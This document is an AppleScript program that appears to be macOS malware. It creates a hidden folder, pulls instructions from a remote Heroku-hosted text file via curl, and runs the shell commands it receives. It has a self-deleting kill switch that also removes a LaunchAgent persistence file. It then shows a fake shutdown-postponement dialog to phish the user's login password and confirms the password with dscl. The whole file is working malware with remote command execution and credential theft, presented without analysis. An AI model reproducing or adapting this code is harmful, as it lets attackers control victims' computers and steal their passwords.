try
	set theuser to do shell script "whoami"
	try
		do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
	end try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
on error
	return
end try

set remoteURL to "http://damp-journey-2734.herokuapp.com/remote.txt"
try
	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")

	if (item 1 of commandArgs) is "true" then -- Kill
		try
			try
				do shell script "rm -rf ~/public/." & theuser
			end try
			try
				do shell script "rm ~/library/LaunchAgents/com.h4k.plist"
			end try
			try
				do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
			end try
		end try
		return
	else if (item 2 of commandArgs) is "true" then -- Hold
		return
	else
		set encPass to (item 3 of commandArgs) -- Get encryption password
		if (count of commandArgs) > 3 then
			repeat with a from 4 to (count of commandArgs)
				try
					do shell script (item a of commandArgs) -- Run commands
				end try
			end repeat
		end if
	end if
on error
	return
end try

repeat
	set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 5 with hidden answer) -- Prompt for Password
	set passwd to text returned of quest
	if gave up of quest = true then -- If the user doesn't enter a password:
		display dialog "Done"
	end if
	try
		log passwd
		do shell script "dscl . -passwd /Users/" & theuser & " " & passwd & " benwashere"
		do shell script "dscl . -passwd /Users/" & theuser & " benwashere " & passwd & "" -- Check if password is correct
		exit repeat
	on error err
		log err
		display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 giving up after 3 -- If password is incorrect, try again
	end try
end repeat

